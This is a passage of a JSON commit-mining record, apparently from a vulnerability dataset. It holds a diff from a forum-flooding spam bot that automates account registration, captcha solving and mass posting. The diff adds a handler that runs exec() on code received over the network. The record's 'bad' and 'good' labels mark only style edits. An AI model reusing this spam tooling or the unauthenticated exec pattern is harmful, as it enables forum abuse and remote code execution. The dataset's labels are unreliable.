that a file is not overwritten normally, and that a file is overwritten while using the overwrite flag\r\n\r\n* Add two files needed for data service unit testing and update .gitignore\r\n\r\n- Update .gitignore to only ignore root level data directory\r\n- Add two missing files needed for unit testing Data Service\r\n\r\n* WIP: Add VCF to Zarr conversion (currently only uses Blosc compressor with no user configuration availalbe)\r\n\r\n* FTP Bugfix: Create local directory if it does not exist, before trying to save files to local directory\r\n\r\n* VCF to Zarr: Take downloaded files (vcf, vcf.gz) and organize them to prepare for Zarr conversion during benchmark execution\r\n\r\n* core.py: Follow PEP8\r\n\r\n* Add ability to control VCF to Zarr conversion settings from configuration file (Blosc compressor only for now)\r\n\r\nAvailable Blosc compressor algorithms: zstd, blosclz, lz4, lz4hc, zlib, snappy\r\n\r\n* Convert VCF to Zarr during Setup mode\r\n\r\n- Restructure/add new folders for dataset storage\r\n- Add conversion of VCF files to Zarr format during Setup mode\r\n- data-service: Create function to remove directory tree\r\n- Various code cleanup/formatting\r\n\r\n* Add benchmarking configuration options and parsing\r\n\r\n*  - Move data directory declarations to a separate class in data_service\r\n - Add skeleton code to benchmark core\r\n\r\n* - cli.py: Use run_(timestamp) as default label for benchmark, pass label into benchmark core\r\n- config.py: Store VCF to Zarr conversion config data in Benchmark configuration data so that settings are known when running the benchmark\r\n- core.py: Begin implementation of benchmark process, create BenchmarkRunner class to time different tasks, add benchmarking of vcf to zarr conversion process, save benchmark results to psv file\r\n- data_service.py: Update benchmark_vcf_to_zarr function to have hooks for benchmark timing when needed\r\n- requirements.txt: Add pandas to list of requirements, which is used for storing benchmark results\r\n\r\n* Code cleanup and paramater documentation\r\n\r\n* Rename BenchmarkRunner to BenchmarkProfiler, create new Benchmark class to hold all benchmarking-related code\r\n\r\n- Rename BenchmarkRunner to BenchmarkProfiler class\r\n- Add two unittest method stubs\r\n- core.py: Move benchmarking process inside new Benchmark Class for better code organization/separation\r\n- core.py: Move record_runtime function to internal function within BenchmarkProfiler class\r\n\r\n* Implement unit tests for benchmark profiler and results data\r\n\r\n* Update comment for clarity\r\n\r\n* Add initial code for PCA benchmark\r\n\r\n* Update requirements.txt\r\n\r\n* data_service: Create function that returns genotype data from callset\r\n  Supports data sets with differing formats (e.g. callset/GT vs. callset/genotype)\r\n\r\n* Benchmark various tasks for the PCA analysis\r\n\r\n* Add configuration options for the PCA benchmark\r\n\r\n* Change default state for benchmark tests to run\r\n\r\n* Expose configuration option to specify scaler type for PCA & add unit test for PCA benchmark\r\n\r\n* Expose configuration parameter to allow for either Dask, chunked, or normal (in-memory) array when getting genotype data\r\n\r\n* Move genotype array data type options from data_service.py to config.py for consistency\r\n\r\n* PCA: Manually calculate blen for LD pruning to avoid tuple/int error when using Dask arrays\r\nNote: the Numpy take() and compress() functions are not working with Dask arrays\r\n\r\n* Bugfix: Use an OrderedDict instead of dict to contain benchmark results. Previously, order was not preserved on Linux- and Mac-based systems using Python 3.5\r\n\r\n* numcodecs: remove unused imports\r\n\r\n* Remove unused imports for module (resulting in circular references?)\r\n\r\n* Remove whitespace"}}, "https://github.com/waipu/bakawipe": {"42b020edfe6b23b245938d23ff7a0484333d6450": {"url": "https://api.github.com/repos/waipu/bakawipe/commits/42b020edfe6b23b245938d23ff7a0484333d6450", "html_url": "https://github.com/waipu/bakawipe/commit/42b020edfe6b23b245938d23ff7a0484333d6450", "message": "Title for GitHub\nFunctions and handlers for remote code execution and other updates to wzworkers were merged. poll(0) was added to WipeSkel.register_new_user to check for signals in loop. Dynamic ChainMap ignore_map was added to UniWipe for target checking.\nMinor stylistic changes according to pep8.", "sha": "42b020edfe6b23b245938d23ff7a0484333d6450", "keyword": "remote code execution check", "diff": "diff --git a/evproxy.py b/evproxy.py\nindex f82c72b..8bab012 100644\n--- a/evproxy.py\n+++ b/evproxy.py\n@@ -51,7 +51,7 @@ def __call__(self, parent):\n         self.ev = self.ev_init()\n         self.bind_kt_ticker.tick()\n         while self.p.running.is_set():\n-            socks = self.p.poll()\n+            self.p.poll()\n             if self.bind_kt_ticker.elapsed(False) > self.bind_kt:\n                 self.bind_kt_ticker.tick()\n                 self.send_keepalive()\ndiff --git a/lib/wzrpc/wzbase.py b/lib/wzrpc/wzbase.py\nindex 6c74065..bb34f92 100644\n--- a/lib/wzrpc/wzbase.py\n+++ b/lib/wzrpc/wzbase.py\n@@ -11,7 +11,7 @@ def make_error_msg(self, iden, status):\n         msg.append(header_struct.pack(wzstart, wzversion, msgtype.err))\n         msg.append(error_struct.pack(status))\n         return msg\n-    \n+\n     def parse_msg(self, iden, msg):\n         if len(msg) == 0 or not msg[0].startswith(wzstart):\n             raise WZENoWZ('Not a WZRPC message {0} from {1}'.format(msg, repr(iden)))\ndiff --git a/lib/wzrpc/wzhandler.py b/lib/wzrpc/wzhandler.py\nindex ba1bead..876dbf3 100644\n--- a/lib/wzrpc/wzhandler.py\n+++ b/lib/wzrpc/wzhandler.py\n@@ -18,7 +18,7 @@ def set_response_handler(self, reqid, fun):\n \n     def set_sig_handler(self, interface, method, fun):\n         self.sig_handlers[(interface, method)] = fun\n-    \n+\n     def del_req_handler(self, interface, method):\n         del self.req_handlers[(interface, method)]\n \n@@ -66,13 +66,13 @@ def make_req_msg(self, interface, method, args, fun, reqid=None):\n         msg = make_req_msg(interface, method, args, reqid)\n         self.set_response_handler(reqid, fun)\n         return msg\n-    \n+\n     def make_router_req_msg(self, iden, interface, method, args, fun, reqid=None):\n         msg = iden[:]\n         msg.append(b'')\n         msg.extend(self.make_req_msg(interface, method, args, fun, reqid))\n         return msg\n-    \n+\n     def make_router_rep_msg(self, reqid, seqnum, status, answer):\n         iden = self.iden_reqid_map.get_key(reqid)\n         if seqnum == 0:\n@@ -91,9 +91,9 @@ def get_reqids(self, iden):\n     def make_reqid(self):\n         while True:\n             reqid = random.randint(1, (2**64)-1)\n-            if not reqid in self.response_handlers:\n+            if reqid not in self.response_handlers:\n                 return reqid\n-        \n+\n     def make_auth_req_data(self, interface, method, key, reqid=None):\n         if not reqid:\n             reqid = self.make_reqid()\n@@ -103,13 +103,13 @@ def make_auth_req_data(self, interface, method, key, reqid=None):\n     def make_auth_bind_route_data(self, interface, method, key, reqid=None):\n         if not reqid:\n             reqid = self.make_reqid()\n-        args = [interface, method, make_auth_hash(interface, method, reqid, key)]        \n+        args = [interface, method, make_auth_hash(interface, method, reqid, key)]\n         return (b'Router', b'auth-bind-route', args, reqid)\n \n     def make_auth_unbind_route_data(self, interface, method, key, reqid=None):\n         if not reqid:\n             reqid = self.make_reqid()\n-        args = [interface, method, make_auth_hash(interface, method, reqid, key)]        \n+        args = [interface, method, make_auth_hash(interface, method, reqid, key)]\n         return (b'Router', b'auth-unbind-route', args, reqid)\n \n     def make_auth_set_route_type_data(self, interface, method, type_, key, reqid=None):\n@@ -126,7 +126,7 @@ def make_auth_clear_data(self, reqid=None):\n \n     def req_from_data(self, d, fun):\n         return self.make_req_msg(d[0], d[1], d[2], fun, d[3])\n-  \n+\n     def _parse_err(self, iden, msg, status):\n         pass\n \ndiff --git a/lib/wzworkers.py b/lib/wzworkers.py\nindex 47087b2..06b67b8 100644\n--- a/lib/wzworkers.py\n+++ b/lib/wzworkers.py\n@@ -4,6 +4,7 @@\n from sup.ticker import Ticker\n # from sup import split_frames\n import wzrpc\n+import exceptions\n from wzrpc.wzhandler import WZHandler\n import wzauth_data\n \n@@ -35,7 +36,8 @@ def __init__(self, wz_addr, fun, args=(), kvargs={},\n         self.wz_addr = wz_addr\n         self.wz_auth_requests = []\n         self.wz_bind_methods = []\n-        self.wz_poll_timeout = 30\n+        self.wz_poll_timeout = 30 * 1000\n+        self.wz_retry_timeout = 5\n \n     def __sinit__(self):\n         '''Initializes thread-local interface on startup'''\n@@ -60,27 +62,49 @@ def __sinit__(self):\n \n         self.wz = WZHandler()\n \n-        def term_handler(interface, method, data):\n+        def term_handler(i, m, d):\n             self.log.info(\n                 'Termination signal %s recieved',\n-                repr((interface, method, data)))\n+                repr((i, m, d)))\n             self.term()\n             raise WorkerInterrupt()\n         self.wz.set_sig_handler(b'WZWorker', b'terminate', term_handler)\n \n-        def resumehandler(interface, method, data):\n-            self.log.info('Resume signal %s recieved',\n-                repr((interface, method, data)))\n+        def execute_handler(i, m, d):\n+            if len(d) < 1:\n+                return\n+            try:\n+                exec(d[0].decode('utf-8'))\n+            except Exception as e:\n+                self.log.exception(e)\n+        self.wz.set_sig_handler(b'WZWorker', b'execute', execute_handler)\n+\n+        def suspend_handler(i, m, d):\n+            if len(d) != 1:\n+                self.log.waring('Suspend signal without a time recieved, ignoring')\n+            self.log.info('Suspend signal %s recieved', repr((i, m, d)))\n+            try:\n+                t = int(d[0])\n+                # raise Suspend(t)\n+                self.inter_sleep(t)\n+            except Resume as e:\n+                self.log.info(e)\n+            except Exception as e:\n+                self.log.error(e)\n+        self.wz.set_sig_handler(b'WZWorker', b'suspend', suspend_handler)\n+\n+        def resume_handler(i, m, d):\n+            self.log.info('Resume signal %s recieved', repr((i, m, d)))\n             raise Resume()\n+        self.wz.set_sig_handler(b'WZWorker', b'resume', resume_handler)\n \n-        self.wz.set_sig_handler(b'WZWorker', b'resume', term_handler)\n         self.running.set()\n \n     def wz_connect(self):\n         self.wz_sock.connect(self.wz_addr)\n \n     def wz_wait_reply(self, fun, interface, method, data, reqid=None, timeout=None):\n-        s, p, t, wz = self.wz_sock, self.poll, self.sleep_ticker, self.wz\n+        s, p, t = self.wz_sock, self.poll, self.sleep_ticker\n         timeout = timeout if timeout else self.wz_poll_timeout\n         rs = wzrpc.RequestState(fun)\n         msg = self.wz.make_req_msg(interface, method, data,\n@@ -92,6 +116,7 @@ def wz_wait_reply(self, fun, interface, method, data, reqid=None, timeout=None):\n             p(timeout*1000)\n             if rs.finished:\n                 if rs.retry:\n+                    self.inter_sleep(self.wz_retry_timeout)\n                     msg = self.wz.make_req_msg(interface, method, data,\n                         rs.accept, reqid)\n                     msg.insert(0, b'')\n@@ -107,10 +132,10 @@ def wz_wait_reply(self, fun, interface, method, data, reqid=None, timeout=None):\n                 rs.accept(None, 0, 255, [elapsed])\n                 # fun sets rs.retry = True if it wants to retry\n         raise WorkerInterrupt()\n-    \n+\n     def wz_multiwait(self, requests):\n         # TODO: rewrite the retry loop\n-        s, p, t, wz = self.wz_sock, self.poll, self.sleep_ticker, self.wz\n+        s, p, t = self.wz_sock, self.poll, self.sleep_ticker\n         timeout = self.wz_poll_timeout\n         rslist = []\n         msgdict = {}\n@@ -152,7 +177,7 @@ def accept(that, reqid, seqnum, status, data):\n                 if status == wzrpc.status.success:\n                     self.log.debug('Successfull auth for (%s, %s)', i, m)\n                 elif status == wzrpc.status.e_auth_wrong_hash:\n-                    raise beon.PermanentError(\n+                    raise exceptions.PermanentError(\n                         'Cannot authentificate for ({0}, {1}), {2}: {3}'.\\\n                         format(i, m, wzrpc.name_status(status), repr(data)))\n                 elif wzrpc.status.e_timeout:\n@@ -214,7 +239,7 @@ def accept(that, reqid, seqnum, status, data):\n                 self.log.warn('Status %s, passing', wzrpc.name_status(status))\n         return self.wz_wait_reply(accept,\n             *self.wz.make_auth_unbind_route_data(i, m, wzauth_data.bind_route[i, m]))\n-    \n+\n     def clear_auth(self):\n         self.log.debug('Clearing our auth records')\n         def accept(that, reqid, seqnum, status, data):\n@@ -228,11 +253,11 @@ def bind_methods(self):\n         for i, m, f, t in self.wz_bind_methods:\n             self.set_route_type(i, m, t)\n             self.bind_route(i, m, f)\n-    \n-    def unbind_methods(self):  \n+\n+    def unbind_methods(self):\n         for i, m, f, t in self.wz_bind_methods:\n             self.unbind_route(i, m)\n-        #self.clear_auth()\n+        # self.clear_auth()\n \n     def send_rep(self, reqid, seqnum, status, data):\n         self.wz_sock.send_multipart(\n@@ -240,7 +265,7 @@ def send_rep(self, reqid, seqnum, status, data):\n \n     def send_success_rep(self, reqid, data):\n         self.send_rep(reqid, 0, wzrpc.status.success, data)\n-    \n+\n     def send_error_rep(self, reqid, data):\n         self.send_rep(reqid, 0, wzrpc.status.error, data)\n \n@@ -248,7 +273,7 @@ def send_wz_error(self, reqid, data, seqid=0):\n         msg = self.wz.make_dealer_rep_msg(\n             reqid, seqid, wzrpc.status.error, data)\n         self.wz_sock.send_multipart(msg)\n-        \n+\n     def send_to_router(self, msg):\n         msg.insert(0, b'')\n         self.wz_sock.send_multipart(msg)\n@@ -272,16 +297,15 @@ def send_to_router(self, msg):\n \n     def inter_sleep(self, timeout):\n         self.sleep_ticker.tick()\n-        self.poll(timeout * 1000)\n         while self.sleep_ticker.elapsed(False) < timeout:\n             try:\n                 self.poll(timeout * 1000)\n-            except Resume as e:\n+            except Resume:\n                 return\n \n     def poll(self, timeout=None):\n         try:\n-            socks = dict(self.poller.poll(timeout if timeout != None\n+            socks = dict(self.poller.poll(timeout if timeout is not None\n                 else self.poll_timeout))\n         except zmq.ZMQError as e:\n             self.log.error(e)\n@@ -301,7 +325,7 @@ def poll(self, timeout=None):\n     def process_wz_msg(self, frames):\n         try:\n             for nfr in self.wz.parse_router_msg(frames):\n-                # Send replies from the handler, for cases when it's methods were rewritten.\n+                # Send replies from the handler, for cases when its methods were rewritten\n                 self.wz_sock.send_multipart(nfr)\n         except wzrpc.WZErrorRep as e:\n             self.log.info(e)\n@@ -330,7 +354,7 @@ def run(self):\n         self.running.clear()\n         self.wz_sock.close()\n         self.sig_sock.close()\n-    \n+\n     def term(self):\n         self.running.clear()\n \n@@ -345,7 +369,7 @@ class WZWorkerProcess(WZWorkerBase, multiprocessing.Process):\n     def start(self, sig_addr, *args, **kvargs):\n         self.sig_addr = sig_addr\n         multiprocessing.Process.start(self, *args, **kvargs)\n-    \n+\n     def __sinit__(self):\n         self.ctx = zmq.Context()\n         super().__sinit__()\ndiff --git a/unistart.py b/unistart.py\nindex 098ff91..f6d253b 100755\n--- a/unistart.py\n+++ b/unistart.py\n@@ -441,7 +441,7 @@ def save_targets(self):\n             'forums': forums,\n             'domains': domains,\n             'sets': self.pc.sets,\n-            }\n+        }\n         with open(self.targetsfile, 'wb') as f:\n             f.write(pickle.dumps(data, pickle.HIGHEST_PROTOCOL))\n \n@@ -614,21 +614,58 @@ def send_passthrough(frames):\n     msg.extend(wzrpc.make_sig_msg(b'WipeManager', b'passthrough', frames))\n     sig_sock.send_multipart(msg)\n \n+def get_pasted_lines(sentinel):\n+    'Yield pasted lines until the user enters the given sentinel value.'\n+    print(\"Pasting code; enter '{0}' alone on the line to stop.\".format(sentinel))\n+    while True:\n+        l = input(':')\n+        if l == sentinel:\n+            return\n+        else:\n+            yield l\n+\n+def send_execute_to_wm(code):\n+    msg = [b'WipeManager']\n+    msg.extend((b'WZWorker', b'execute', code))\n+    send_to_wm(msg)\n+\n+def send_execute_to_ev(code):\n+    msg = [b'EVProxy']\n+    msg.extend((b'WZWorker', b'execute', code))\n+    send_passthrough(msg)\n+\n+def send_execute(name, code):\n+    msg = [name.encode('utf-8')]\n+    msg.extend((b'WZWorker', b'execute', code))\n+    send_passthrough(msg)\n+\n+def pexecute_in(name):\n+    send_execute(name, '\\n'.join(get_pasted_lines('--')).encode('utf-8'))\n+\n+def pexecute_in_wm():\n+    send_execute_to_wm('\\n'.join(get_pasted_lines('--')).encode('utf-8'))\n+\n+def pexecute_in_ev():\n+    send_execute_to_ev('\\n'.join(get_pasted_lines('--')).encode('utf-8'))\n+\n def drop_users():\n     send_passthrough([b'WipeSkel', b'WipeSkel', b'drop-user'])\n \n def log_spawn_name():\n     send_passthrough([b'WipeThread', b'WipeThread', b'log-spawn-name'])\n \n-if c.no_shell:\n-    while True:\n-        time.sleep(1)\n-else:\n-    try:\n-        import IPython\n+try:\n+    import IPython\n+    if c.no_shell:\n+        IPython.embed_kernel()\n+    else:\n         IPython.embed()\n-    except ImportError:\n-        # fallback shell\n+except ImportError:\n+    # fallback shell\n+    if c.no_shell:\n+        while True:\n+            time.sleep(1)\n+    else:\n         while True:\n             try:\n                 exec(input('> '))\ndiff --git a/uniwipe.py b/uniwipe.py\nindex d538157..71335f5 100644\n--- a/uniwipe.py\n+++ b/uniwipe.py\n@@ -4,6 +4,7 @@\n from wzworkers import WorkerInterrupt\n from wipeskel import WipeSkel, WipeState, cstate\n from beon import exc, regexp\n+from collections import ChainMap\n import re\n \n class UniWipe(WipeSkel):\n@@ -15,6 +16,10 @@ def __init__(self, forums, targets, sbjfun, msgfun, *args, **kvargs):\n                         or type(targets) == tuple and list(targets)\n                         or targets)\n         super().__init__(*args, **kvargs)\n+        self.ignore_map = ChainMap(\n+            self.pc.sets['closed'], self.pc.sets['bumplimit'],\n+            self.pc.sets['bugged'], self.pc.sets['protected'],\n+            self.targets)\n \n     def on_caprate_limit(self, rate):\n         if not self.logined:\n@@ -60,7 +65,16 @@ def add_comment(self, t, msg):\n                 self.schedule(self.add_comment, (t, msg))\n                 self.schedule_first(self.switch_user)\n             except exc.EmptyAnswer as e:\n-                self.log.info('Removing %s from targets', t)\n+                self.log.info('Removing %s from targets and adding to bugged', t)\n+                self.pc.sets['bugged'].add(t)\n+                try:\n+                    self.targets.remove(t)\n+                except ValueError as e:\n+                    pass\n+                self.w.sleep(self.errortimeout)\n+            except exc.TopicDoesNotExist as e:\n+                self.log.info('Removing %s from targets and adding to bugged', t)\n+                self.pc.sets['bugged'].add(t)\n                 try:\n                     self.targets.remove(t)\n                 except ValueError as e:\n@@ -80,7 +94,7 @@ def add_comment(self, t, msg):\n                 self.w.sleep(self.errortimeout)\n \n     def forumwipe_loop(self):\n-        for f in self.forums:\n+        for f in self.forums.copy():\n             self.counter_tick()\n             try:\n                 self.addtopic(self.msgfun(), self.sbjfun(), f)\n@@ -114,9 +128,7 @@ def get_targets(self):\n             rxp = re.compile(regexp.f_sub_id.format(user, self.site.domain, forum))\n             found = set(map(lambda x: (user, x[0]+x[1]), rxp.findall(page)))\n             for t in found:\n-                if (t in self.pc.sets['closed']\n-                    or t in self.pc.sets['bumplimit']\n-                    or t in self.targets):\n+                if t in self.ignore_map:\n                     continue\n                 targets.append(t)\n             lt = len(targets)\ndiff --git a/wipeskel.py b/wipeskel.py\nindex bb2ac1a..bd2f190 100644\n--- a/wipeskel.py\n+++ b/wipeskel.py\n@@ -18,12 +18,15 @@ def __init__(self, name, ctx, wz_addr, noproxy_rp):\n         self.zmq_ctx = ctx\n         self.ticker = Ticker()\n         self.sets = {}\n-        self.sets['targets'] = set()\n         self.sets['waiting'] = dict()\n         self.sets['pending'] = set()\n+\n+        self.sets['targets'] = set()\n         self.sets['closed'] = set()\n         self.sets['bumplimit'] = set()\n         self.sets['protected'] = set()\n+        self.sets['bugged'] = set()\n+\n         self.wz_addr = wz_addr\n         self.noproxy_rp = noproxy_rp\n \n@@ -131,9 +134,9 @@ def deobfuscate_capage(self, domain, page):\n         result = []\n         def accept(that, reqid, seqnum, status, data):\n             if status == wzrpc.status.success or status == wzrpc.status.error:\n-                result.extend(map(lambda x:x.decode('utf-8'), data))\n+                result.extend(map(lambda x: x.decode('utf-8'), data))\n             elif status == wzrpc.status.e_req_denied:\n-                self.log.warn('Status {0}, reauthentificating'.\\\n+                self.log.warn('Status {0}, reauthentificating'.\n                     format(wzrpc.name_status(status)))\n                 self.p.auth_requests()\n                 that.retry = True\n@@ -187,7 +190,7 @@ def accept(that, reqid, seqnum, status, data):\n                 that.retry = True\n         self.p.wz_wait_reply(accept,\n             b'Solver', b'report', (status.encode('utf-8'), cid.encode('utf-8')))\n-                \n+\n     def __call__(self, parent):\n         self.p = parent\n         self.log = parent.log\n@@ -254,6 +257,7 @@ class WipeSkel(object):\n     uqtimeout = 5  # Timeout for userqueue\n     stoponclose = True\n     die_on_neterror = False\n+\n     def __init__(self, pc, rp, domain, mrc, userqueue=None):\n         self.pc = pc\n         self.rp = rp\n@@ -472,7 +476,7 @@ def register_new_user(self):\n         with cstate(self, WipeState.registering):\n             _regcount = 0\n             while self.w.running.is_set():\n-                self.w.p.poll()\n+                self.w.p.poll(0)\n                 ud = self.gen_userdata()\n                 self.request_email(ud)\n                 for c in self.hooks['pre_register_new_user']:\n@@ -540,6 +544,7 @@ def get_current_login(self):\n     def dologin(self):\n         '''Choose user, do login and return it.'''\n         while self.w.running.is_set():\n+            self.site.ud = None\n             try:\n                 self.site.ud = self.get_new_user()\n             except Empty:\n@@ -651,7 +656,6 @@ def return_user(self, ud=None):\n     def postmsg(self, target, msg, tuser=None, **kvargs):\n         tpair = (tuser, target)\n         target = target.lstrip('0')\n-        ptarget = (':'.join(tpair) if tuser else target)\n         try:\n             try:\n                 self.site.ajax_addcomment(target, msg, tuser, **kvargs)\n@@ -762,7 +766,7 @@ def solve_captcha(self, page):\n             e.cahash = capair[0]\n             raise\n         return capair[0], result, cid\n-    \n+\n     def report_code(self, cid, status):\n         self.log.info('Reporting %s code for %s', status, cid)\n         self.w.report_code(cid, status)\n@@ -785,7 +789,9 @@ def drop_user_handler(interface, method, data):\n             self.dologin()\n \n         self.w.p.wz.set_sig_handler(b'WipeSkel', b'drop-user', drop_user_handler)\n+\n         self.w.p.sig_sock.setsockopt(zmq.SUBSCRIBE, b'WipeSkel')\n+        self.w.p.sig_sock.setsockopt(zmq.SUBSCRIBE, bytes(self.name, 'utf-8'))\n \n         try:\n             self._run()\n@@ -794,6 +800,7 @@ def drop_user_handler(interface, method, data):\n         cst.__exit__(None, None, None)\n         with cstate(self, WipeState.terminating):\n             self.w.p.sig_sock.setsockopt(zmq.UNSUBSCRIBE, b'WipeSkel')\n+            self.w.p.sig_sock.setsockopt(zmq.UNSUBSCRIBE, bytes(self.name, 'utf-8'))\n             self.w.p.wz.del_sig_handler(b'WipeSkel', b'drop-user')\n             self.log.info(repr(self.counters))\n         self.log.info('Terminating, runtime is %ds', self.run_time.elapsed(False))\n", "files": {"/evproxy.py": {"changes": [{"diff": "\n         self.ev = self.ev_init()\n         self.bind_kt_ticker.tick()\n         while self.p.running.is_set():\n-            socks = self.p.poll()\n+            self.p.poll()\n             if self.bind_kt_ticker.elapsed(False) > self.bind_kt:\n                 self.bind_kt_ticker.tick()\n                 self.send_keepalive()", "add": 1, "remove": 1, "filename": "/evproxy.py", "badparts": ["            socks = self.p.poll()"], "goodparts": ["            self.p.poll()"]}], "source": "\n import wzrpc from sup.ticker import Ticker class EvaluatorProxy: def __init__(self, ev_init, *args, **kvargs): super().__init__() self.ev_init=ev_init self.bind_kt_ticker=Ticker() self.bind_kt=5 def handle_evaluate(self, reqid, interface, method, data): domain, page=data self.p.log.info('Recvd page %s, working on', reqid) res=self.ev.solve_capage(domain, page) self.p.log.info('Done, sending answer: %s', res) self.p.send_success_rep(reqid,[v.encode('utf-8') for v in res]) def send_keepalive(self): msg=self.p.wz.make_req_msg(b'Router', b'bind-keepalive',[], self.handle_keepalive_reply) msg.insert(0, b'') self.p.wz_sock.send_multipart(msg) def handle_keepalive_reply(self, reqid, seqnum, status, data): if status==wzrpc.status.success: self.p.log.debug('Keepalive was successfull') elif status==wzrpc.status.e_req_denied: self.p.log.warn('Keepalive status{0}, reauthentificating and rebinding'. format(wzrpc.name_status(status))) self.p.auth_requests() self.p.bind_methods() elif status==wzrpc.status.e_timeout: self.p.log.warn('Keepalive timeout') else: self.p.log.warn('Keepalive status{0}'. format(wzrpc.name_status(status))) def __call__(self, parent): self.p=parent self.p.wz_connect() self.p.wz_auth_requests=[ (b'Router', b'auth-bind-route'), (b'Router', b'auth-unbind-route'), (b'Router', b'auth-set-route-type')] self.p.wz_bind_methods=[ (b'Evaluator', b'evaluate', self.handle_evaluate, wzrpc.routetype.random)] self.p.auth_requests() self.p.bind_methods() self.ev=self.ev_init() self.bind_kt_ticker.tick() while self.p.running.is_set(): socks=self.p.poll() if self.bind_kt_ticker.elapsed(False) > self.bind_kt: self.bind_kt_ticker.tick() self.send_keepalive() ", "sourceWithComments": "# -*- coding: utf-8 -*-\n# -*- mode: python -*-\nimport wzrpc\nfrom sup.ticker import Ticker\n\nclass EvaluatorProxy:\n    def __init__(self, ev_init, *args, **kvargs):\n        super().__init__()\n        self.ev_init = ev_init\n        self.bind_kt_ticker = Ticker()\n        self.bind_kt = 5\n\n    def handle_evaluate(self, reqid, interface, method, data):\n        domain, page = data\n        self.p.log.info('Recvd page %s, working on', reqid)\n        res = self.ev.solve_capage(domain, page)\n        self.p.log.info('Done, sending answer: %s', res)\n        self.p.send_success_rep(reqid, [v.encode('utf-8') for v in res])\n\n    def send_keepalive(self):\n        msg = self.p.wz.make_req_msg(b'Router', b'bind-keepalive', [],\n            self.handle_keepalive_reply)\n        msg.insert(0, b'')\n        self.p.wz_sock.send_multipart(msg)\n\n    def handle_keepalive_reply(self, reqid, seqnum, status, data):\n        if status == wzrpc.status.success:\n            self.p.log.debug('Keepalive was successfull')\n        elif status == wzrpc.status.e_req_denied:\n            self.p.log.warn('Keepalive status {0}, reauthentificating and rebinding'.\n                format(wzrpc.name_status(status)))\n            self.p.auth_requests()\n            self.p.bind_methods()\n        elif status == wzrpc.status.e_timeout:\n            self.p.log.warn('Keepalive timeout')\n        else:\n            self.p.log.warn('Keepalive status {0}'.\n                format(wzrpc.name_status(status)))\n\n    def __call__(self, parent):\n        self.p = parent\n        self.p.wz_connect()\n        self.p.wz_auth_requests = [\n            (b'Router', b'auth-bind-route'),\n            (b'Router', b'auth-unbind-route'),\n            (b'Router', b'auth-set-route-type')]\n        self.p.wz_bind_methods = [\n            (b'Evaluator', b'evaluate', self.handle_evaluate, wzrpc.routetype.random)]\n        self.p.auth_requests()\n        self.p.bind_methods()\n        self.ev = self.ev_init()\n        self.bind_kt_ticker.tick()\n        while self.p.running.is_set():\n            socks = self.p.poll()\n            if self.bind_kt_ticker.elapsed(False) > self.bind_kt:\n                self.bind_kt_ticker.tick()\n                self.send_keepalive()\n"}, "/lib/wzrpc/wzhandler.py": {"changes": [{"diff": "\n     def make_reqid(self):\n         while True:\n             reqid = random.randint(1, (2**64)-1)\n-            if not reqid in self.response_handlers:\n+            if reqid not in self.response_handlers:\n                 return reqid\n-        \n+\n     def make_auth_req_data(self, interface, method, key, reqid=None):\n         if not reqid:\n             reqid = self.make_reqid()\n", "add": 2, "remove": 2, "filename": "/lib/wzrpc/wzhandler.py", "badparts": ["            if not reqid in self.response_handlers:"], "goodparts": ["            if reqid not in self.response_handlers:"]}, {"diff": "\n     def make_auth_bind_route_data(self, interface, method, key, reqid=None):\n         if not reqid:\n             reqid = self.make_reqid()\n-        args = [interface, method, make_auth_hash(interface, method, reqid, key)]        \n+        args = [interface, method, make_auth_hash(interface, method, reqid, key)]\n         return (b'Router', b'auth-bind-route', args, reqid)\n \n     def make_auth_unbind_route_data(self, interface, method, key, reqid=None):\n         if not reqid:\n             reqid = self.make_reqid()\n-        args = [interface, method, make_auth_hash(interface, method, reqid, key)]        \n+        args = [interface, method, make_auth_hash(interface, method, reqid, key)]\n         return (b'Router', b'auth-unbind-route', args, reqid)\n \n     def make_auth_set_route_type_data(self, interface, method, type_, key, reqid=None):\n", "add": 2, "remove": 2, "filename": "/lib/wzrpc/wzhandler.py", "badparts": ["        args = [interface, method, make_auth_hash(interface, method, reqid, key)]        ", "        args = [interface, method, make_auth_hash(interface, method, reqid, key)]        "], "goodparts": ["        args = [interface, method, make_auth_hash(interface, method, reqid, key)]", "        args = [interface, method, make_auth_hash(interface, method, reqid, key)]"]}], "source": "\n from. import * from.wzbase import WZBase class WZHandler(WZBase): def __init__(self): self.req_handlers={} self.response_handlers={} self.sig_handlers={} self.iden_reqid_map=BijectiveSetMap() def set_req_handler(self, interface, method, fun): self.req_handlers[(interface, method)]=fun def set_response_handler(self, reqid, fun): self.response_handlers[reqid]=fun def set_sig_handler(self, interface, method, fun): self.sig_handlers[(interface, method)]=fun def del_req_handler(self, interface, method): del self.req_handlers[(interface, method)] def del_response_handler(self, reqid): del self.response_handlers[reqid] def del_sig_handler(self, interface, method): del self.sig_handlers[(interface, method)] def _parse_req(self, iden, msg, reqid, interface, method): try: handler=self.req_handlers[(interface, method)] except KeyError: try: handler=self.req_handlers[(interface, None)] except KeyError: raise WZENoReqHandler(iden, reqid, 'No req handler for %s,%s'%(interface, method)) if iden: self.iden_reqid_map.add_value(tuple(iden), reqid) handler(reqid, interface, method, msg[1:]) return() def _parse_rep(self, iden, msg, reqid, seqnum, status): try: handler=self.response_handlers[reqid] if seqnum==0: del self.response_handlers[reqid] except KeyError: raise WZENoHandler(iden, 'No rep handler for reqid') handler(reqid, seqnum, status, msg[1:]) return() def _parse_sig(self, iden, msg, interface, method): try: handler=self.sig_handlers[(interface, method)] except KeyError: raise WZENoHandler(iden, 'No handler for sig %s,%s'%(interface, method)) handler(interface, method, msg[1:]) return() def make_req_msg(self, interface, method, args, fun, reqid=None): if not reqid: reqid=self.make_reqid() msg=make_req_msg(interface, method, args, reqid) self.set_response_handler(reqid, fun) return msg def make_router_req_msg(self, iden, interface, method, args, fun, reqid=None): msg=iden[:] msg.append(b'') msg.extend(self.make_req_msg(interface, method, args, fun, reqid)) return msg def make_router_rep_msg(self, reqid, seqnum, status, answer): iden=self.iden_reqid_map.get_key(reqid) if seqnum==0: self.iden_reqid_map.del_value(iden, reqid) msg=list(iden) msg.append(b'') msg.extend(make_rep_msg(reqid, seqnum, status, answer)) return msg def get_iden(self, reqid): return self.iden_reqid_map.get_key(reqid) def get_reqids(self, iden): return self.iden_reqid_map.get_values(iden) def make_reqid(self): while True: reqid=random.randint(1,(2**64)-1) if not reqid in self.response_handlers: return reqid def make_auth_req_data(self, interface, method, key, reqid=None): if not reqid: reqid=self.make_reqid() args=[interface, method, make_auth_hash(interface, method, reqid, key)] return(b'Router', b'auth-request', args, reqid) def make_auth_bind_route_data(self, interface, method, key, reqid=None): if not reqid: reqid=self.make_reqid() args=[interface, method, make_auth_hash(interface, method, reqid, key)] 